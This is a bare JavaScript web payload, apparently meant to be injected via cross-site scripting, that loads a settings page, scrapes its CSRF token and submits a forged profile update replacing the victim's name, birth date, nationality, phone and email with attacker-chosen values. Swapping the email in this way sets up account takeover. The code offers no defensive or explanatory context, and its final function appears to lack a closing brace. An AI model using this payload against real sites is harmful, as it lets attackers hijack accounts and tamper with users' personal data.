var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/settings/general',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf-token" content="(\w+)"/)[1];
    fetch('/settings/general/edit-profile', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: '_token=' + token +
        '&_method=PUT' +
        '&last_name=Ahauka' +
        '&first_name=Makuri' +
        '&date_de_naissance=1992-11-05' +
        '&nationalite=BE' +
        '&email=tesyt@csrf-ahahah.com' +
        '&phone=0499999999'
});
